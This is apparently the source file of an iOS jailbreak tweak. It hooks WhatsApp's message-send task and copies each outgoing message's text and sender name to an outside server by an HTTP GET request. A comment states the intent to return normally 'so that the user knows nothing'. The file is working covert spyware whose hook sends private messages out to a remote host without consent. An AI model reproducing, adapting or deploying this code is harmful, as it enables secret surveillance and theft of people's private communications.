#import "WAMessage.h"


// hooking into the class to edit it's methods
%hook WAMessageSendTask

-(id)initWithMessage:(id)arg1
{
	// log the message to device log
    NSLog(@"Debug nslog %@ %@",[(WAMessage *)arg1 bestSenderName],[(WAMessage *)arg1 text]);
	
    // creating a get request so that the message and the sender will be save to the server
	NSURL *url = [[NSURL alloc]initWithString:[NSString stringWithFormat:@"http://isammour.com/get.php?text=%@&sender=%@",[(WAMessage *)arg1 bestSenderName],[(WAMessage *)arg1 text]]];   
	NSMutableURLRequest *request = [[NSMutableURLRequest alloc]initWithURL:url];
	[request setHTTPMethod:@"GET"];
	[[NSURLConnection alloc] initWithRequest:request delegate:self];

// return from the function normally so that the user knows nothing
return %orig(arg1);
}

%end